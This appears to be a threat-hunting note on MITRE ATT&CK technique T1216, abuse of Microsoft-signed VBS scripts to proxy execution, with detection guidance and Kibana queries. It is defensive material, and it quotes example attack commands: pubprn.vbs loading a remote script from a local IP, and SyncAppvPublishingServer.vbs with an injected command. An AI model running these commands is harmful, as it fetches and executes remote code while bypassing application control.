# T1216 Signed Script Proxy Execution

-----------------------------------------------------------------------

## Technique Description

Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)

## Technique Detection

Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.

## Host Analytics

### Hunter Notes

- Information Here

#### Analytic 1

  * **Information:** Monitor script processes, such as cscript, and command-line parameters for “trusted” scripts like PubPrn.vbs that may be used to proxy execution of malicious files.

  * **Source:**  Windows Audits, Sysmon

  * **Tool:** Kibana

  * **Notes:**  An example command is: cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png.

  * **Query:** ```Process.name : cscript.exe or wscript.exe AND process.command_line : *```

#### Analytic 2

  * **Information:** Monitor for rare VBS script usage

  * **Source:**  Windows Audits, Sysmon

  * **Tool:** Kibana

  * **Notes:** Example command is C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
      - You could sort by count ascending 

  * **Query:** ```Process.name : *.vbs```
